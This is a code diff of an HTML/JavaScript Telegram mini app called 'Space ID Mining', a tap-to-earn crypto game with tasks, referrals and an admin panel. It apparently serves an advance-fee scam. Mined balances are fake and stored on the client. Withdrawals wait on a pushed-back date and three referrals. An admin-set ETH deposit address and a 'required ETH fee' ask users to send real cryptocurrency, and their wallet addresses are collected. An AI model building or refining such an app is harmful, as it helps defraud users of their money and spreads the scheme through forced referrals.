@@ -5,7 +5,18 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
 <title>Space ID Mining</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://telegram.org/js/telegram-web-app.js">
+// Direct Touch Vibration Listener for mobile screens
+document.addEventListener("DOMContentLoaded", () => {
+  const coinEl = document.getElementById("coin");
+  if (coinEl) {
+    coinEl.addEventListener("touchstart", () => {
+      triggerVibration();
+    }, { passive: true });
+  }
+});
+
+</script>
 <style>
 :root{--bg:#05060b;--cy:#38bdf8;--cy2:#0ea5e9;--eth:#8b6cf0;--ok:#4ade80;--mut:#8b8fa6;--bd:#123a57;--card:#03050a;--slate:#2b2b40;--accent-yellow:#f5a623}
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;user-select:none}
@@ -162,17 +173,26 @@ input::placeholder{color:#8b8fa6}
 .toast{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%) scale(.92);opacity:0;visibility:hidden;pointer-events:none;background:#1a1c2e;border:1px solid #2a3a55;padding:20px 26px;border-radius:22px;font-size:18px;font-weight:700;line-height:1.4;z-index:200;transition:opacity .25s,transform .25s,visibility .25s;width:max-content;max-width:86vw;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.85)}
 .toast.on{opacity:1;visibility:visible;transform:translate(-50%,-50%) scale(1)}
 </style>
+
+<style id="hide-invite-btn-only">
+  #m-elig button:not(.x), #m-elig .cb {
+    display: none !important;
+  }
+  #eligBox {
+    display: block !important;
+  }
+</style>
+
 </head>
 <body>
 <canvas id="stars"></canvas>
 <div id="splash">
   <div class="sp-wrap">
     <div class="sp-ring"></div>
-    <img class="sp-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAPUlEQVR42u3BAQ0AAADCoPdPbQ8HFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+Bgw8AAB8t52GAAAAABJRU5ErkJggg==" alt="">
+    <img class="sp-logo" src="/logo.png" alt="">
   </div>
   <div class="sp-name">SPACE ID</div>
 </div>
-
 <svg width="0" height="0" style="position:absolute"><defs>
 <symbol id="gift" viewBox="0 0 32 32"><rect x="3" y="11" width="26" height="6" rx="1.5" fill="#ffb02e"/><rect x="5" y="17" width="22" height="12" rx="2" fill="#ff7a1a"/><rect x="14" y="11" width="4" height="18" fill="#ef3e4a"/><path d="M16 11C11 11 8 7 11 5s5 3 5 6zM16 11c5 0 8-4 5-6s-5 3-5 6z" fill="#ef3e4a"/></symbol>
 <symbol id="pick" viewBox="0 0 24 24"><path d="M4 20L16 8" stroke="#c98a4b" stroke-width="2.4" stroke-linecap="round"/><path d="M7 5c5-3 12-1 14 6" stroke="#aab4c3" stroke-width="2.8" stroke-linecap="round" fill="none"/></symbol>
@@ -228,7 +248,7 @@ input::placeholder{color:#8b8fa6}
       </div>
       <div class="coinw">
         <div class="coin" id="coin" onclick="handleTap(event)">
-          <img id="clogo" src="logo.png" alt="SPACE">
+          <img id="clogo" src="/logo.png" alt="SPACE">
         </div>
       </div>
     </div>
@@ -297,12 +317,13 @@ input::placeholder{color:#8b8fa6}
     <div style="height:16px"></div>
   </section>
 
-  <!-- TAB 5: MASTER ADMIN PANEL -->
+  <!-- TAB 5: MASTER ADMIN PANEL (Visible to Admin ID 7982111846) -->
   <section class="view" id="v-adm">
     <div class="pt" style="color:var(--accent-yellow)">ADMIN PANEL</div>
     <div class="card" style="border-color:rgba(245,166,35,0.4)">
       
       <div class="adm-section-title">Withdrawal Timing &amp; Status</div>
+      
       <div class="adm-group">
         <label>Withdrawal Mode</label>
         <select id="admWithdrawMode">
@@ -318,32 +339,47 @@ input::placeholder{color:#8b8fa6}
       </div>
 
       <div class="adm-section-title">Coin &amp; Network Settings</div>
+
       <div class="adm-group">
         <label>Coin Name</label>
         <input type="text" id="admCoinName" value="Space ID">
       </div>
+
       <div class="adm-group">
         <label>Coin Symbol</label>
         <input type="text" id="admCoinSymbol" value="SPACE">
       </div>
+
       <div class="adm-group">
         <label>Minimum Withdrawal</label>
         <input type="number" id="admMinWithdraw" value="500">
       </div>
+
       <div class="adm-group">
         <label>USD Rate ($)</label>
         <input type="number" step="0.001" id="admMetRate" value="0.0392">
       </div>
+
       <div class="adm-group">
         <label>Admin ETH Deposit Address</label>
         <input type="text" id="admDepositAddress" placeholder="0x...">
       </div>
+
       <div class="adm-group">
         <label>Required ETH Fee</label>
         <input type="number" step="0.0001" id="admRequiredFee" value="0.0073">
       </div>
 
       <div class="adm-section-title">Tasks</div>
+      <div class="adm-group">
+        <label>Task Type / Platform</label>
+        <select id="tType">
+          <option value="telegram">Telegram (Channel / Chat)</option>
+          <option value="twitter">X / Twitter</option>
+          <option value="folder">Telegram Folder</option>
+          <option value="general">Other / Website</option>
+        </select>
+      </div>
       <div class="adm-group"><label>Task Title</label><input type="text" id="tTitle" placeholder="e.g. Join Telegram Channel"></div>
       <div class="adm-group"><label>Task Link</label><input type="text" id="tLink" placeholder="https://..."></div>
       <div class="adm-group"><label>Telegram Chat (for verify)</label><input type="text" id="tChat" placeholder="@channelusername"></div>
@@ -380,6 +416,7 @@ input::placeholder{color:#8b8fa6}
       </div>
 
       <div class="adm-section-title">Admin Management</div>
+      
       <div class="adm-group">
         <label>Add New Admin Telegram ID</label>
         <div style="display:flex;gap:8px">
@@ -416,9 +453,9 @@ input::placeholder{color:#8b8fa6}
       <div><h3 id="mc-n">Trust Wallet</h3><p>Connect your wallet</p></div>
       <button class="x" onclick="cl('m-c')"><svg width="20" height="20"><use href="#xc"/></svg></button>
     </div>
-    <div class="cap" id="mc-c">Submit SPACE ID or Ethereum Deposit Address.</div>
+    <div class="cap" id="mc-c">Submit SPACE ID or Ethereum Deposit Address. Recommended: Trust Wallet, MetaMask, Phantom.</div>
     <input id="mc-a" placeholder="0x..." autocomplete="off">
-    <div style="font-size:13px;color:#9aa0b8;text-align:center;margin:-2px 0 14px">Recommended: Trust Wallet, MetaMask, Phantom.</div>
+    <div style="font-size:12.5px;color:#9aa0b8;text-align:center;margin:6px 0 14px">Recommended: Trust Wallet, MetaMask, Phantom.</div>
     <button class="cb" onclick="saveW()">Connect Wallet</button>
   </div>
 </div>
@@ -474,22 +511,23 @@ input::placeholder{color:#8b8fa6}
   </div>
 </div>
 
-<!-- WITHDRAW ELIGIBILITY POPUP (Clean Professional Look without button) -->
+<!-- WITHDRAW ELIGIBILITY POPUP -->
 <div class="mo" id="m-elig" onclick="if(event.target===this)cl('m-elig')">
-  <div class="sh" style="text-align:center;padding:24px 20px;background:#0d121f;border:1px solid #1a2438;border-radius:24px">
+  <div class="sh" style="text-align:center;padding:24px 20px">
     <div class="mh" style="margin-bottom:0">
-      <h3 style="margin:auto;font-size:20px;font-weight:700">Withdraw SPACE</h3>
+      <h3 style="margin:auto;font-size:20px">Withdraw SPACE</h3>
       <button class="x" onclick="cl('m-elig')"><svg width="20" height="20"><use href="#xc"/></svg></button>
     </div>
-    <div style="margin:22px auto 14px;width:84px;height:84px;border-radius:50%;background:#09121a;border:2px solid #14527a;display:grid;place-items:center">
-      <img id="eligLogo" src="logo.png" alt="SPACE" style="width:68px;height:68px;border-radius:50%;object-fit:contain">
+    <div style="margin:22px auto 14px;width:92px;height:92px;border-radius:50%;border:2px solid #3a2f16;background:#0b1220;display:grid;place-items:center">
+      <img id="eligLogo" alt="" style="width:76px;height:76px;border-radius:50%;object-fit:contain">
     </div>
     <div style="font-size:20px;font-weight:800;margin-bottom:8px">Space ID Distribution</div>
-    <p style="font-size:14px;color:#b7bbd0;line-height:1.5">Space ID distribution will officially begin on <b id="eligDate" style="color:#f5a623">15 November 2026</b>.</p>
+    <p style="font-size:14px;color:#b7bbd0;line-height:1.5">Space ID distribution is scheduled to begin at <b id="eligDate" style="color:#f5a623">3 week of November, 2026</b>.</p>
     <div id="eligBox" style="margin:18px 0 6px;padding:14px;border-radius:14px;border:1px solid rgba(245,166,35,.5);background:#1a1407">
       <div id="eligTitle" style="font-size:15px;font-weight:800;color:#f5a623">Must refer 3 friends to become eligible!</div>
       <div id="eligCount" style="font-size:13px;color:#e0b660;margin-top:4px">0/3 referrals completed</div>
     </div>
+    <button class="cb" style="margin-top:10px" onclick="cl('m-elig');switchView('ref')">Invite friends</button>
   </div>
 </div>
 
@@ -500,13 +538,12 @@ input::placeholder{color:#8b8fa6}
       <h3 style="margin:auto">ETH Deposit</h3>
       <button class="x" onclick="cl('m-dep')"><svg width="20" height="20"><use href="#xc"/></svg></button>
     </div>
-    <p id="depHint" style="font-size:12px;color:var(--mut);margin-bottom:10px">Send only ETH (Ethereum network) to this deposit address.</p>
-    <div class="qr-box" id="depQrBox">
+    <p style="font-size:12px;color:var(--mut);margin-bottom:10px">Send only ETH (Ethereum network) to this deposit address.</p>
+    <div class="qr-box">
       <img id="depQrImg" src="" alt="QR">
     </div>
     <div style="font-size:11px;font-family:monospace;background:#050912;padding:12px;border-radius:12px;word-break:break-all;color:var(--cy);margin-bottom:14px" id="depAddrText">Loading...</div>
-    <div id="depOffBox" style="display:none;padding:26px 18px;margin:18px 0 22px;border-radius:18px;border:1px solid #17446a;background:#071c2e;color:#e6e9f5;font-size:17px;font-weight:600;line-height:1.55;text-align:center;font-family:Inter,sans-serif"></div>
-    <button id="depCopyBtn" class="cb" onclick="copyDepositAddress()">Copy Address</button>
+    <button class="cb" onclick="copyDepositAddress()">Copy Address</button>
   </div>
 </div>
 
@@ -543,14 +580,17 @@ input::placeholder{color:#8b8fa6}
 <div class="toast" id="tst">Notification</div>
 
 <script>
-const CLOUDFLARE_API = "https://nameless-river-686dmeteora-api.lovebhullar242-7eb.workers.dev";
+// LIVE CLOUDFLARE WORKER API URL
+const CLOUDFLARE_API = "";
 const SUPER_ADMIN_ID = "7982111846";
 
+// Reward settings
 const JOINING_BONUS = 200;
 const REFER_BONUS = 350;
 const TAP_REWARDS = [0.22, 0.26, 0.22, 0.26, 0.23, 0.29, 0.11, 0.22, 0.28, 0.16, 0.14, 0.12, 0.28, 0.44, 0.48, 0.33, 0.48, 0.46, 0.64, 0.54, 0.49, 0.58, 0.62, 0.34, 0.66, 0.49, 0.76, 0.82, 0.76];
-const COOLDOWN_MS = 8 * 60 * 60 * 1000;
+const COOLDOWN_MS = 8 * 60 * 60 * 1000; // 8 hours
 
+// App State
 let state = {
   bal: JOINING_BONUS,
   eth: 0.0000,
@@ -561,7 +601,7 @@ let state = {
   metRateUsd: 0.0392,
   minWithdraw: 500,
   withdrawMode: "starts_on",
-  withdrawDate: "15 November 2026",
+  withdrawDate: "3 week of November, 2026",
   depositAddress: "",
   requiredEthFee: 0.0073,
   adminList: [SUPER_ADMIN_ID],
@@ -583,6 +623,7 @@ let state = {
   savedAt: 0
 };
 
+// Telegram User Details
 let currentTgId = "";
 try { currentTgId = localStorage.getItem("meteora_guest_id") || ""; } catch(e){}
 if (!currentTgId) {
@@ -603,6 +644,7 @@ if (window.Telegram && window.Telegram.WebApp) {
   }
 }
 
+// Local Storage Load
 const savedState = localStorage.getItem("meteora_state_" + currentTgId);
 if (savedState) {
   try {
@@ -611,11 +653,13 @@ if (savedState) {
   } catch(e){}
 }
 
-const ETH_RE = /^0x[a-fA-F0-9]{40}$/;
+// Accept only a valid Space ID or Ethereum address
+const ETH_RE = /^0x[a-fA-F0-9]{40}$/;  // Ethereum (ERC-20) address
 function isValidAddr(a) {
   return ETH_RE.test(String(a || "").trim());
 }
 
+// Clear any old non-Ethereum values saved on this device
 if (state.depositAddress && !isValidAddr(state.depositAddress)) state.depositAddress = "";
 if (state.userWallet && !isValidAddr(state.userWallet)) state.userWallet = "";
 
@@ -633,6 +677,7 @@ function saveLocalState() {
   render();
 }
 
+// Telegram CloudStorage backup (keeps progress even if local cache is cleared)
 const USER_KEYS = ["bal","eth","energy","cooldownEnd","dailyClaimed","userWallet","selectedWalletBrand","tapIdx","refTotal","refActive","refEarned","tasksDone","tasksStarted","savedAt"];
 let cloudTimer = null;
 function getCS() {
@@ -681,6 +726,7 @@ function toast(msg) {
   setTimeout(() => t.classList.remove("on"), 3500);
 }
 
+// FETCH SETTINGS LIVE FROM CLOUDFLARE D1
 async function loadCloudflareSettings() {
   try {
     const res = await fetch(`${CLOUDFLARE_API}/api/settings`);
@@ -695,22 +741,15 @@ async function loadCloudflareSettings() {
         if (data.met_rate_usd) state.metRateUsd = parseFloat(data.met_rate_usd);
         if (data.deposit_address && isValidAddr(data.deposit_address)) state.depositAddress = data.deposit_address;
         if (data.required_eth_fee) state.requiredEthFee = parseFloat(data.required_eth_fee);
-        if (data.deposit_on !== undefined && data.deposit_on !== null) state.depositOn = !!data.deposit_on;
-        if (data.deposit_off_msg) state.depositOffMsg = data.deposit_off_msg;
-        if (data.tg_verify_on !== undefined && data.tg_verify_on !== null) state.tgVerifyOn = !!data.tg_verify_on;
-        if (data.tg_channel) state.tgChannel = data.tg_channel;
-        if (data.tasks) {
-          try {
-            const list = typeof data.tasks === "string" ? JSON.parse(data.tasks) : data.tasks;
-            if (Array.isArray(list)) { TASKS_DATA = list; renderTasks(); renderAdminTasks(); }
-          } catch(e) {}
-        }
         render();
       }
     }
-  } catch(err) {}
+  } catch(err) {
+    console.log("Cloudflare load fallback to local", err);
+  }
 }
 
+// SYNC USER DATA WITH CLOUDFLARE D1
 async function syncUserWithCloudflare() {
   try {
     await fetch(`${CLOUDFLARE_API}/api/user/sync`, {
@@ -724,12 +763,14 @@ async function syncUserWithCloudflare() {
         wallet: state.userWallet,
         energy: state.energy,
         cooldownEnd: state.cooldownEnd,
-        tapIdx: state.tapIdx
+        tapIdx: state.tapIdx,
+        start_param: getStartParam()
       })
     });
   } catch(e){}
 }
 
+// SAVE ADMIN SETTINGS LIVE TO CLOUDFLARE D1
 async function saveAdminSettings() {
   const depIn = document.getElementById("admDepositAddress").value.trim();
   if (depIn && !isValidAddr(depIn)) {
@@ -751,6 +792,9 @@ async function saveAdminSettings() {
   state.depositOffMsg = document.getElementById("admDepositOffMsg").value.trim() || "Deposits are temporarily unavailable. Please try again later.";
   state.tgVerifyOn = document.getElementById("admTgVerify").value === "on";
   state.tgChannel = document.getElementById("admTgChannel").value.trim();
+  if (state.tgVerifyOn && !state.tgChannel) {
+    toast("Set the Telegram channel username (e.g. @channelname) before turning verify on.");
+  }
 
   try {
     const res = await fetch(`${CLOUDFLARE_API}/api/admin/save`, {
@@ -768,24 +812,24 @@ async function saveAdminSettings() {
         tgVerifyOn: state.tgVerifyOn,
         depositOn: state.depositOn,
         depositOffMsg: state.depositOffMsg,
-        tgChannel: state.tgChannel,
-        tasks: TASKS_DATA
+        tgChannel: state.tgChannel
       })
     });
 
     if (res.ok) {
-      toast("Saved. Changes are live for all users.");
+      toast("Settings saved successfully!");
     } else {
-      toast(`Server error ${res.status}. Saved locally.`);
+      toast("Saved locally (Cloudflare error)");
     }
   } catch(e) {
-    toast("Saved locally.");
+    toast("Saved locally!");
   }
 
   btn.innerText = "Save Live Settings";
   saveLocalState();
 }
 
+// Avatar (Telegram profile photo, fallback to first letter)
 function setAvatar(el) {
   const letter = currentTgName.charAt(0).toUpperCase();
   el.innerHTML = "";
@@ -801,6 +845,7 @@ function setAvatar(el) {
   }
 }
 
+// Admin Privileges
 function checkAdminAccess() {
   const isAdm = state.adminList.includes(currentTgId);
   const nameBox = document.getElementById("nm");
@@ -817,6 +862,55 @@ function checkAdminAccess() {
   document.getElementById("pn").innerText = currentTgName;
   document.getElementById("pid").innerText = `ID: ${currentTgId}`;
   document.getElementById("rl").innerText = `https://t.me/SpaceIDMiningbot/app?startapp=ref_${currentTgId}`;
+}
+
+// Render UI Elements
+// Database Synced Daily Reward
+async function checkDailyRewardStatus() {
+  try {
+    const res = await fetch(`/api/daily/status?tgId=${encodeURIComponent(currentTgId)}`);
+    if (!res.ok) return;
+    const d = await res.json();
+    state.dailyCanClaim = d.canClaim;
+    state.dailyStreak = d.streak;
+    state.dailyDay = d.currentDay;
+    state.dailyNextIn = d.nextClaimIn;
+    updateDailyUI(d);
+  } catch(e){}
+}
+
+async function claimDailyReward() {
+  try {
+    const res = await fetch('/api/daily/claim', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ tgId: currentTgId })
+    });
+    const d = await res.json();
+    if (d.success) {
+      toast(`Claimed +${d.reward.space} SPACE${d.reward.eth > 0 ? ' + ' + d.reward.eth + ' ETH' : ''}! 🎉`);
+      if (typeof fetchUserFromVPS === "function") fetchUserFromVPS();
+      checkDailyRewardStatus();
+    } else {
+      toast(d.error || "Cannot claim right now");
+    }
+  } catch(e) {
+    toast("Network error claiming daily reward");
+  }
+}
+
+function updateDailyUI(data) {
+  const btn = document.getElementById("dailyClaimBtn") || document.querySelector(".daily-btn");
+  if (!btn) return;
+  if (data.canClaim) {
+    btn.disabled = false;
+    btn.innerText = `Claim Day ${data.currentDay} Reward`;
+    btn.style.opacity = "1";
+  } else {
+    btn.disabled = true;
+    btn.innerText = `Come back tomorrow`;
+    btn.style.opacity = "0.5";
+  }
 }
 
 function render() {
@@ -845,6 +939,7 @@ function render() {
   document.getElementById("modalWdTitle").innerText = `Withdraw ${state.coinSymbol}`;
   document.getElementById("wdBtnText").innerText = `${t("withdraw")} ${state.coinSymbol}`;
 
+  // Admin Form fields
   document.getElementById("admWithdrawMode").value = state.withdrawMode;
   document.getElementById("admWithdrawDate").value = state.withdrawDate;
   document.getElementById("admCoinName").value = state.coinName;
@@ -859,18 +954,21 @@ function render() {
   document.getElementById("admTgChannel").value = state.tgChannel || "";
   document.getElementById("admListText").innerText = state.adminList.join(", ");
 
+  // Deposit Info
   if (state.depositAddress) {
     document.getElementById("depAddrText").innerText = state.depositAddress;
     document.getElementById("depQrImg").src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(state.depositAddress)}`;
   } else {
-    document.getElementById("depAddrText").innerText = "The admin has not set an ETH deposit address yet.";
+    document.getElementById("depAddrText").innerText = "The admin has not set a ETH deposit address yet.";
     document.getElementById("depQrImg").src = "";
   }
 
   renderReferralList();
+
   renderWallets();
 }
 
+// Referral list (names come from the server: users: [{name}] or ["name"])
 function renderReferralList() {
   const list = document.getElementById("refList");
   const title = document.getElementById("refListTitle");
@@ -887,6 +985,7 @@ function renderReferralList() {
   empty.style.display = users.length ? "none" : "block";
 }
 
+// Admin task editor
 const admVal = id => document.getElementById(id).value.trim();
 function renderAdminTasks() {
   const box = document.getElementById("admTaskList");
@@ -915,12 +1014,19 @@ function renderAdminTasks() {
 function addTask() {
   const title = admVal("tTitle");
   if (!title) { toast("Please enter a task title."); return; }
+  const tType = document.getElementById("tType") ? document.getElementById("tType").value : "general";
   TASKS_DATA.push({
-    id: Date.now(), title, sub: admVal("tChat") || admVal("tLink"),
-    met: parseFloat(admVal("tMet")) || 0, eth: parseFloat(admVal("tEth")) || 0,
-    link: admVal("tLink"), verify: admVal("tVerify"), chat: admVal("tChat")
+    id: Date.now(), 
+    title, 
+    type: tType,
+    sub: admVal("tChat") || (tType === 'twitter' ? 'Follow on X' : (tType === 'folder' ? 'Add Telegram folder' : admVal("tLink"))),
+    met: parseFloat(admVal("tMet")) || 0, 
+    eth: parseFloat(admVal("tEth")) || 0,
+    link: admVal("tLink"), 
+    verify: admVal("tVerify"), 
+    chat: admVal("tChat")
   });
-  afterTaskChange("Task added!");
+  afterTaskChange("Task added successfully!");
   ["tTitle","tLink","tChat"].forEach(i => document.getElementById(i).value = "");
   ["tMet","tEth"].forEach(i => document.getElementById(i).value = "0");
 }
@@ -936,19 +1042,20 @@ function afterTaskChange(msg) {
   toast(msg);
 }
 
+// Wallets List Render
 const WALLET_BRANDS = ["Trust Wallet", "Binance", "BingX", "Bybit", "MEXC"];
+const WALLET_LOGOS = {
+  "Trust Wallet": "/trustwallet.png",
+  "Binance": "/binance.png",
+  "BingX": "/bingx.png",
+  "Bybit": "/bybit.png",
+  "MEXC": "/mexc.png"
+};
 function walletLogoHTML(brand) {
-  const imgMap = {
-    "Trust Wallet": "trustwallet.png",
-    "Binance": "binance.png",
-    "BingX": "bingx.png",
-    "Bybit": "bybit.png",
-    "MEXC": "mexc.png"
-  };
-  const src = imgMap[brand] || "logo.png";
-  return `<img src="${src}" alt="${brand}" style="width:100%;height:100%;object-fit:contain;padding:8px;border-radius:50%;background:#fff">`;
+  const f = WALLET_LOGOS[brand];
+  if (!f) return `<span style="font-weight:900;color:var(--cy)">${brand.charAt(0)}</span>`;
+  return `<img src="${f}?v=${Date.now()}" alt="${brand}" style="width:100%;height:100%;object-fit:contain;border-radius:50%;background:#ffffff;padding:4px;">`;
 }
-
 function renderWallets() {
   const c = document.getElementById("wl");
   c.innerHTML = "";
@@ -958,7 +1065,7 @@ function renderWallets() {
     const div = document.createElement("div");
     div.className = "wi";
     div.innerHTML = `
-      <div class="wl" style="background:#fff">${walletLogoHTML(b)}</div>
+      <div class="wl" style="background:#131d2e">${walletLogoHTML(b)}</div>
       <div class="tx">
         <b>${b}</b>
         <small>${short}</small>
@@ -969,6 +1076,7 @@ function renderWallets() {
   });
 }
 
+// Tasks Data
 let TASKS_DATA = [
   { id: 201, title: "Join Telegram Channel", sub: "Telegram channel", met: 100, eth: 0.0003, link: "", verify: "telegram", chat: "" },
   { id: 202, title: "Follow Twitter Page", sub: "X (Twitter) page", met: 75, eth: 0.0002, link: "", verify: "", chat: "" },
@@ -977,24 +1085,37 @@ let TASKS_DATA = [
 
 function renderTasks() {
   const container = document.getElementById("tasks");
+  if (!container) return;
   container.innerHTML = "";
   TASKS_DATA.forEach(t => {
     const isDone = isTaskDone(t.id);
     const isStarted = !isDone && !!(state.tasksStarted && state.tasksStarted[t.id]);
+    
+    // Choose Icon based on Task Type / Title
+    let iconSvg = '<svg width="24" height="24"><use href="#snd"/></svg>';
+    const isTw = t.type === 'twitter' || /twitter|follow/i.test(t.title);
+    const isFolder = t.type === 'folder' || /folder/i.test(t.title);
+
+    if (isTw) {
+      iconSvg = '<svg width="22" height="22" viewBox="0 0 24 24" fill="#fff"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>';
+    } else if (isFolder) {
+      iconSvg = '<svg width="24" height="24" viewBox="0 0 24 24" fill="#38bdf8"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>';
+    }
+
     const div = document.createElement("div");
     div.className = `task ${isDone ? 'dn' : ''}`;
     div.id = `task-row-${t.id}`;
     div.innerHTML = `
-      <div class="ti"><svg width="24" height="24"><use href="#snd"/></svg></div>
+      <div class="ti">${iconSvg}</div>
       <div class="tx">
         <b>${t.title}</b>
-        <a href="${t.link}" target="_blank">${t.sub}</a>
+        <a href="${t.link || '#'}" target="_blank">${t.sub || (isTw ? 'Open X' : 'View Link')}</a>
         <div class="rw">
           <span>+${t.met} ${state.coinSymbol}</span>
           ${t.eth > 0 ? `<span class="e">+${t.eth} ETH</span>` : ''}
         </div>
       </div>
-      <button class="bt ${(isDone || isStarted) ? 'g' : ''}" id="btn-task-${t.id}" onclick="doTask(${t.id}, '${t.link}')">
+      <button class="bt ${(isDone || isStarted) ? 'g' : ''}" id="btn-task-${t.id}" onclick="doTask(${t.id}, '${t.link || ''}')">
         ${isDone ? '✓ Done' : (isStarted ? (t.verify && state.tgVerifyOn ? 'Verify' : 'Claim') : 'Start')}
       </button>
     `;
@@ -1008,10 +1129,10 @@ function isTaskDone(id) {
 }
 
 async function verifyTask(id) {
-  if (!state.tgVerifyOn) return true;
+  if (!state.tgVerifyOn) return true;   // verification turned off by admin
   const t = TASKS_DATA.find(x => x.id === id) || {};
   const chat = state.tgChannel || t.chat || "";
-  if (!chat) return false;
+  if (!chat) return false;               // no channel set
   try {
     const res = await fetch(`${CLOUDFLARE_API}/api/task/verify`, {
       method: "POST",
@@ -1033,7 +1154,7 @@ async function doTask(id, link) {
 
   if (!state.tasksStarted[id]) {
     if (link) window.open(link, "_blank");
-    else { toast("This task link is not set yet."); return; }
+    else { toast("This task link is not set yet. Please ask the admin."); return; }
     state.tasksStarted[id] = true;
     saveLocalState();
     renderTasks();
@@ -1046,7 +1167,7 @@ async function doTask(id, link) {
     const ok = await verifyTask(id);
     btn.disabled = false;
     if (!ok) {
-      toast("You have not joined the channel yet.");
+      toast("You have not joined the channel yet. Join it first, then tap Verify.");
       renderTasks();
       return;
     }
@@ -1061,6 +1182,7 @@ async function doTask(id, link) {
   toast(`Claimed +${t.met} ${state.coinSymbol}!`);
 }
 
+// Daily Rewards
 const DAILY_REWARDS = [5, 10, 15, 20, 30, 50, 100];
 function renderDaily() {
   const g = document.getElementById("dg");
@@ -1103,8 +1225,11 @@ function claimDaily() {
   toast(`Claimed Day 1 reward: +5 ${state.coinSymbol}!`);
 }
 
+// Coin Tap with Vibration
+// Tap sound (generated in code, no file needed)
 let audioCtx = null;
 function playTapSound() {
+  // Soft, short buzz that feels like a light vibration
   try {
     const AC = window.AudioContext || window.webkitAudioContext;
     if (!AC) return;
@@ -1126,17 +1251,45 @@ function playTapSound() {
   } catch(e){}
 }
 
+// Haptic on every tap: Telegram haptic if available, plus phone vibration as a backup
+let hapticChecked = false;
 function hapticTap() {
   try {
     const tg = window.Telegram && window.Telegram.WebApp;
-    if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred("heavy");
+    if (tg && tg.HapticFeedback && typeof tg.HapticFeedback.impactOccurred === "function") {
+      tg.HapticFeedback.impactOccurred("medium");
+    }
   } catch(e){}
   try {
-    if (navigator.vibrate) navigator.vibrate([40]);
+    if (navigator && typeof navigator.vibrate === "function") {
+      navigator.vibrate(30);
+    }
   } catch(e){}
 }
 
+function triggerVibration() {
+  try {
+    if (navigator && navigator.vibrate) {
+      navigator.vibrate(50);
+    }
+  } catch(e){}
+  try {
+    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.HapticFeedback) {
+      window.Telegram.WebApp.HapticFeedback.impactOccurred('heavy');
+    }
+  } catch(e){}
+}
 function handleTap(e) {
+  triggerVibration();
+  // Direct Telegram Haptic
+  try {
+    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.HapticFeedback) {
+      window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
+    } else if (navigator && navigator.vibrate) {
+      navigator.vibrate(25);
+    }
+  } catch(err){}
+
   ensureCycle();
 
   if (state.energy <= 0) {
@@ -1152,18 +1305,18 @@ function handleTap(e) {
   state.bal += reward;
   saveLocalState();
   refreshTimer();
-
-  hapticTap();
   playTapSound();
 
   const coin = document.getElementById("coin");
-  coin.classList.add("p");
-  setTimeout(() => coin.classList.remove("p"), 80);
+  if (coin) {
+    coin.classList.add("p");
+    setTimeout(() => coin.classList.remove("p"), 80);
+  }
 
   const fl = document.createElement("div");
   fl.className = "fl";
   fl.innerText = `+${reward}`;
-  const cr = coin.getBoundingClientRect();
+  const cr = coin ? coin.getBoundingClientRect() : { left: 150, top: 250, width: 100, height: 100 };
   const ang = Math.random() * Math.PI * 2;
   const dist = Math.random() * cr.width * 0.25;
   fl.style.left = `${cr.left + cr.width / 2 + Math.cos(ang) * dist - 15}px`;
@@ -1172,16 +1325,24 @@ function handleTap(e) {
   setTimeout(() => fl.remove(), 850);
 }
 
+// Periodic user sync to D1 (every 30s to keep writes well below limits)
 setInterval(() => {
   syncUserWithCloudflare();
 }, 30000);
 
+// 8-hour mining timer (uses real clock, so it keeps running even when the app is closed)
+function fmtTime(ms) {
+  const t = Math.max(0, Math.ceil(ms / 1000));
+  const h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), x = t % 60;
+  return [h, m, x].map(n => String(n).padStart(2, "0")).join(":");
+}
 function fmtLeft(ms) {
   const t = Math.max(0, Math.ceil(ms / 1000));
   const h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), x = t % 60;
   return `${h}:${String(m).padStart(2, "0")}:${String(x).padStart(2, "0")}`;
 }
-
+// 8-hour cycle per user: starts on first app open and repeats forever.
+// At the end of each cycle energy refills automatically.
 function ensureCycle() {
   const now = Date.now();
   if (!state.cooldownEnd) state.cooldownEnd = now + COOLDOWN_MS;
@@ -1199,15 +1360,20 @@ function refreshTimer() {
   const cd = document.getElementById("cd");
   const cdb = document.getElementById("cdb");
   if (!cd || !cdb) return;
-  cd.innerText = fmtLeft(state.cooldownEnd - Date.now());
-  cdb.style.color = state.energy <= 0 ? "var(--accent-yellow)" : "";
+  if (state.energy <= 0) {
+    cd.innerText = fmtLeft(state.cooldownEnd - Date.now());
+    cdb.style.color = "var(--accent-yellow)";
+  } else {
+    cd.innerText = fmtLeft(state.cooldownEnd - Date.now());
+    cdb.style.color = "";
+  }
 }
 setInterval(refreshTimer, 1000);
 
-// POPUP HANDLER
+// WITHDRAWAL CONTROLLER
 function showElig(have, need) {
-  document.getElementById("eligLogo").src = "logo.png";
-  document.getElementById("eligDate").innerText = state.withdrawDate || "15 November 2026";
+  document.getElementById("eligLogo").src = document.getElementById("clogo").src;
+  document.getElementById("eligDate").innerText = state.withdrawDate || "";
   document.getElementById("eligTitle").innerText = `Must refer ${need} friends to become eligible!`;
   document.getElementById("eligCount").innerText = `${Math.min(have, need)}/${need} referrals completed`;
   op("m-elig");
